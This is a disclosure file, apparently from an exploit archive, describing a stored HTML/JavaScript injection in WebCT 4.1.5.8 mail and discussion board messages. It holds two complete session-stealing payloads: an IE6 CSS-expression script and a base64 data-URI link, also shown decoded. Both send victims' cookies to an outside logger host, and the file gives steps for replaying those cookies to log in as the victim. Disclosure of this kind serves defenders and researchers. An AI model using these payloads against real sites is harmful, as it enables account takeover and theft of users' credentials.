@@ -1,0 +1,95 @@
+source: http://www.securityfocus.com/bid/28107/info
+
+WebCT is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+This issue affects WebCT 4.1.5.8; other versions may also be vulnerable. 
+
+WebCT 4.x Javascript Session Stealer Exploits
+
+Software: WebCT Campus Edition 4.x (http://secunia.com/product/3280/)
+Affected Version: 4.1.5.8
+Discoverer: Benjamin "balupton" Lupton
+Date Discovered: November 2005
+Date Reported: 25/06/2007
+Software Author Contacted (again) on: 20/07/2007
+Date Published: 05/03/2008
+
+Published At:
+http://www.balupton.com/blogs/dev?title=webct_session_stealer_exploit
+http://www.balupton.com/documents/webct_exploits.txt
+http://seclists.org/fulldisclosure/2008/Mar/0051.html
+
+Attack Type:
+Javascript Session Stealer Exploit.
+
+Description:
+Mail & Discussion Board messages are not properly checked for javascript, allowing javascript to perform a session stealing attack (allowing the attacker to be logged in as the victim).
+
+Tested On:
+Attacks were tested fully on eCentral TAFE&#039;s WebCT System in November 2005 (with permission of staff),
+and again on Curtin University&#039;s WebCT System in June 2006 (but this time only to see if the javascript will run).
+
+Action Taken:
+Contacted TAFE lecturers and administrators, who didn&#039;t really care.
+Contacted WestOne multiple times, but never recieved any response.
+Then contacted Secunia, which would not publish as the discoverer did not own their own copy of the software in question.
+Published as WebCT is being phased out, with Blackboard being the replacement.
+
+Steps:
+The attacker publishes the exploit code in a message with "Don&#039;t wrap text" enabled.
+The victim accesses the attacker&#039;s message and their cookies are sent to the attacker&#039;s remote logger.
+The attacker then logs into the system and replaces his/her cookies with the acquired cookies.
+- Cookies are formatted as follows within the "value" attribute: CookieName=CookieValue; NextCookieName=NextCookieValue;
+The attacker is now logged into the system as the victim.
+In this case the logger is located here: http://www.balupton.com/sandbox/logger.php?pass_code=secret_key
+
+Notes:
+Victims must be students (attack does not work on non students, eg. teachers/admins).
+Attack 2 will also run in Opera, but fails to retrieve the document.cookie value.
+Attack 2 uses a base64 encoded javascript which is executed.
+Both attacks can be customized to allow any javascript to run.
+Javascript can also be developed to post a mail or discussion board message, this works for all types of victims.
+
+Resources:
+Attack Code: See below
+Logger: http://localhost.balupton.com/sandbox/logger.php?pass_code=secret_key&show_source=true
+Base64 Decoder / Encoder: http://www.balupton.com/sandbox/base64.php
+Cookie Editor: Firefox - http://editcookies.mozdev.org/ , Opera - Built In
+
+Attack 1 - IE6SP2 Exploit (Automatic):
+<div id="mycode" style="BACKGROUND: url(&#039;java
+script:eval(document.all.mycode.expr)&#039;)" expr="// balupton&#039;s javascript session stealer automatic hack
+	var iframe = document.createElement(&#039;iframe&#039;);
+	iframe.style.border = &#039;none&#039;;
+	iframe.style.height = &#039;1px&#039;;
+	iframe.style.width = &#039;1px&#039;;
+	var url =
+		&#039;http&#039;+&#039;://www.balupton.com/sandbox/logger.php&#039;
+		+&#039;?variable=document.cookie&#039;
+		+&#039;&value=&#039;+escape(document.cookie)
+		+&#039;&url=&#039;+escape(document.location)
+		+&#039;&pass_code=secret_key&#039;
+		;
+	iframe.src = url;
+	document.body.appendChild(iframe);">Thank you</div>
+
+
+Attack 2 - Firefox Exploit (Manual):
+<a href="data:text/html;base64,PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KLy8gYmFsdXB0b24ncyBqYXZhc2NyaXB0IHNlc3Npb24gc3RlYWxlciBtYW51YWwgaGFjaw0KdmFyIHVybCA9DQoJJ2h0dHA6Ly93d3cuYmFsdXB0b24uY29tL3NhbmRib3gvbG9nZ2VyLnBocCcNCgkrJz92YXJpYWJsZT1kb2N1bWVudC5jb29raWUnDQoJKycmdmFsdWU9Jytlc2NhcGUoZG9jdW1lbnQuY29va2llKQ0KCSsnJnVybD0nK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlciA/IGRvY3VtZW50LnJlZmVycmVyIDogJ2h0dHA6Ly9leHBsb2l0ZWRfdXJsLmNvbScpDQoJKycmcGFzc19jb2RlPXNlY3JldF9rZXknDQoJOw0KZG9jdW1lbnQubG9jYXRpb24gPSB1cmw7DQo8L3NjcmlwdD4=">Click Me!</a>
+
+Attack 2 - Firefox Exploit (Manual) - Decoded:
+<script type="text/javascript">
+// balupton&#039;s javascript session stealer manual hack
+var url =
+	&#039;http://www.balupton.com/sandbox/logger.php&#039;
+	+&#039;?variable=document.cookie&#039;
+	+&#039;&value=&#039;+escape(document.cookie)
+	+&#039;&url=&#039;+escape(document.referrer ? document.referrer : &#039;http://exploited_url.com&#039;)
+	+&#039;&pass_code=secret_key&#039;
+	;
+document.location = url;
+</script>
+
+
